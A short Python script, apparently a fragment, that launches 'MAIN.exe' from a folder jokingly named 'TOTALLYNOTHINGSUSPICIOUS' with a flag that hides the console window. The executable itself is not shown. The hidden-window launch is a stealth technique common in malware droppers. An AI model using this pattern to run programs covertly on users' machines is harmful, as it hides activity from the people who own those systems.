import shutil
import os
import sys
import time
import subprocess

directory=r'C:/TOTALLYNOTHINGSUSPICIOUS'

subprocess.Popen([directory+'/'+'MAIN.exe'],stdout=subprocess.PIPE,creationflags=0x08000000)
